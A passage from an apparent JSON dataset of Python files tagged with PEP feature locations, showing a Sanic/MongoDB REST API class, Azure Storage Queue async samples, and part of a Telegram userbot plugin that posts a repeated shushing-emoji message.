self.postprocess['PUT_SINGLE']:\n            self.postprocess['PATCH_SINGLE'].append(postprocess)\n        for preprocess in self.preprocess['PUT_SINGLE']:\n            self.preprocess['PATCH_SINGLE'].append(preprocess)\n        for postprocess in self.postprocess['PUT_MANY']:\n            self.postprocess['PATCH_MANY'].append(postprocess)\n        for preprocess in self.preprocess['PUT_MANY']:\n            self.preprocess['PATCH_MANY'].append(preprocess)\n    async def _search(self, request):\n        page = request.args.get(\"page\", \"1\")\n        page = int(page)\n        cursor = self.motor_db.db[self.collection_name].find()\n        resp = []\n        async for data in cursor:\n            if \"_id\" in data:\n                data[\"_id\"] = str(data[\"_id\"])\n                resp.append(data)\n        new_page = page + 1\n        return json({\n                     \"num_results\": len(resp),\n                     \"page\": page,\n                     \"next_page\": new_page,\n                     \"objects\": resp\n                     })\n    async def get(self, request, instid=None):\n        if instid is None:\n            return await self._search(request)\n        data = await self.motor_db.db[self.collection_name].find_one({'_id': {'$eq': ObjectId(instid)}})\n        if data is not None:\n            if \"_id\" in data:\n                data[\"_id\"] = str(data[\"_id\"])\n            return json(data)\n        else:\n            return json(dict(message='No result found'),status=520)\n    async def delete(self, request, instid=None):\n        id = ObjectId(instid)\n        result = await self.motor_db.db[self.collection_name].delete_one({'_id': {'$eq': id}})\n        return json({})\n    async def post(self, request):\n        content_type = request.headers.get('Content-Type', \"\")\n        content_is_json = content_type.startswith('application/json')\n        if not content_is_json:\n            msg = 'Request must have \"Content-Type: application/json\" header'\n            return json(dict(message=msg),status=520)\n        try:\n            data = request.json or {}\n        except (ServerError, TypeError, ValueError, OverflowError) as exception:\n            return json(dict(message='Unable to decode data'),status=520)\n        if \"_id\" in data:\n            del data[\"_id\"]\n        if self.primary_key is not None:\n            result = await self.motor_db.db[self.collection_name].insert_one(data)\n            data[\"_id\"] = str(result.inserted_id)\n            return json(data)\n        return json(None, status=520)\n    async def put(self, request, instid=None):\n        content_type = request.headers.get('Content-Type', \"\")\n        content_is_json = content_type.startswith('application/json')\n        if not content_is_json:\n            msg = 'Request must have \"Content-Type: application/json\" header'\n            return json(dict(message=msg),status=520)\n        try:\n            data = request.json or {}\n        except (ServerError, TypeError, ValueError, OverflowError) as exception:\n            return json(dict(message='Unable to decode data'),status=520)\n        if \"_id\" in data:\n            del data[\"_id\"]\n        id = ObjectId(instid)\n        result = await self.motor_db.db[self.collection_name].update_one({'_id': id}, {'$set': data})\n        data[\"_id\"] = instid\n        return json(data)",
            "patterns": {
                "pep_468": [
                    [
                        20,
                        "super(ModelView, self).__init__(*args, **kw)"
                    ],
                    [
                        28,
                        "super(API, self).__init__(motor_db, *args, **kw)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        49,
                        52,
                        "async for",
                        "async for data in cursor:\n            if \"_id\" in data:\n                data[\"_id\"] = str(data[\"_id\"])\n                resp.append(data)"
                    ]
                ]
            }
        },
        "176": {
            "file": "from datetime import datetime, timedelta\nimport asyncio\nimport os\nclass QueueMessageSamplesAsync(object):\n    connection_string = os.getenv(\"CONNECTION_STRING\")\n    async def set_access_policy(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        await queue.send_message(u\"hello world\")\n        try:\n            from azure.storage.queue import AccessPolicy, QueueSasPermissions\n            access_policy = AccessPolicy()\n            access_policy.start = datetime.utcnow() - timedelta(hours=1)\n            access_policy.expiry = datetime.utcnow() + timedelta(hours=1)\n            access_policy.permission = QueueSasPermissions(read=True)\n            identifiers = {'my-access-policy-id': access_policy}\n            await queue.set_queue_access_policy(identifiers)\n            from azure.storage.queue import generate_queue_sas\n            sas_token = generate_queue_sas(\n                queue.account_name,\n                queue.queue_name,\n                queue.credential.account_key,\n                policy_id='my-access-policy-id'\n            )\n            token_auth_queue = QueueClient.from_queue_url(\n                queue_url=queue.url,\n                credential=sas_token\n            )\n            my_messages = token_auth_queue.receive_messages()\n        finally:\n            await queue.delete_queue()\n    async def queue_metadata(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        try:\n            metadata = {'foo': 'val1', 'bar': 'val2', 'baz': 'val3'}\n            await queue.set_queue_metadata(metadata=metadata)\n            properties = await queue.get_queue_properties()\n        finally:\n            await queue.delete_queue()\n    async def send_and_receive_messages(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        try:\n            await asyncio.gather(\n                queue.send_message(u\"message1\"),\n                queue.send_message(u\"message2\", visibility_timeout=30),  \n                queue.send_message(u\"message3\"),\n                queue.send_message(u\"message4\"),\n                queue.send_message(u\"message5\")\n            )\n            messages = queue.receive_messages()\n            async for msg in messages:\n                print(msg.content)\n            messages = queue.receive_messages(messages_per_page=5)\n            async for msg_batch in messages.by_page():\n                for msg in msg_batch:\n                    print(msg.content)\n                    await queue.delete_message(msg)\n        finally:\n            await queue.delete_queue()\n    async def delete_and_clear_messages(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        try:\n            await asyncio.gather(\n                queue.send_message(u\"message1\"),\n                queue.send_message(u\"message2\"),\n                queue.send_message(u\"message3\"),\n                queue.send_message(u\"message4\"),\n                queue.send_message(u\"message5\")\n            )\n            messages = queue.receive_messages()\n            async for msg in messages:\n                await queue.delete_message(msg)\n                break\n            await queue.clear_messages()\n        finally:\n            await queue.delete_queue()\n    async def peek_messages(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        try:\n            await asyncio.gather(\n                queue.send_message(u\"message1\"),\n                queue.send_message(u\"message2\"),\n                queue.send_message(u\"message3\"),\n                queue.send_message(u\"message4\"),\n                queue.send_message(u\"message5\")\n            )\n            msg = await queue.peek_messages()\n            messages = await queue.peek_messages(max_messages=5)\n            for message in messages:\n                print(message.content)\n        finally:\n            await queue.delete_queue()\n    async def update_message(self):\n        from azure.storage.queue.aio import QueueClient\n        queue = QueueClient.from_connection_string(self.connection_string, \"my_queue\")\n        await queue.create_queue()\n        try:\n            await queue.send_message(u\"update me\")\n            messages = queue.receive_messages()\n            async for message in messages:\n                message = await queue.update_message(\n                    message,\n                    visibility_timeout=0,\n                    content=u\"updated\")\n                break\n        finally:\n            await queue.delete_queue()",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        56,
                        57,
                        "async for",
                        "async for msg in messages:\n                print(msg.content)"
                    ],
                    [
                        59,
                        62,
                        "async for",
                        "async for msg_batch in messages.by_page():\n                for msg in msg_batch:\n                    print(msg.content)\n                    await queue.delete_message(msg)"
                    ],
                    [
                        78,
                        80,
                        "async for",
                        "async for msg in messages:\n                await queue.delete_message(msg)\n                break"
                    ],
                    [
                        109,
                        114,
                        "async for",
                        "async for message in messages:\n                message = await queue.update_message(\n                    message,\n                    visibility_timeout=0,\n                    content=u\"updated\")\n                break"
                    ]
                ]
            }
        },
        "177": {
            "file": "import asyncio\nfrom telethon import events\nfrom telethon.tl.types import ChannelParticipantsAdmins\nfrom uniborg.util import admin_cmd\n@borg.on(admin_cmd(\"chup\"))\nasync def _(event):\n    if event.fwd_from:\n        return\n    mentions = \"`chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 chup\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10\ud83e\udd2b\ud83e\udd10 